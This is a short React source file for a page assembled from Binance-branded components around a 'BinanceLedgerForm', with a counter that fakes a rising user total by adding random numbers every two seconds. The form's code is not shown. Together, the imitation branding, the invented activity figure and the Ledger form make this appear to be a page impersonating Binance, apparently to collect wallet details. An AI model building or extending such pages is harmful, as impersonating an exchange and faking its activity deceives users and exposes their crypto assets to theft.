
import React, { useState, useEffect } from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceSubHeader from "@/components/BinanceSubHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceLedgerForm from "@/components/BinanceLedgerForm";
import BinanceAppPromotion from "@/components/BinanceAppPromotion";

const Index = () => {
  const [userCount, setUserCount] = useState(274368184);

  useEffect(() => {
    // Simulate counter increasing every few seconds
    const counterInterval = setInterval(() => {
      setUserCount(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 2000);
    
    return () => {
      clearInterval(counterInterval);
    };
  }, []);

  // Format the user count with commas
  const formattedUserCount = userCount.toLocaleString();

  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      <BinanceSubHeader />
      
      <main className="flex-grow">
        {/* Form Section */}
        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6">
          <BinanceLedgerForm />
        </div>
      </main>
      
      <BinanceFooter />
      <BinanceAppPromotion />
    </div>
  );
};

export default Index;
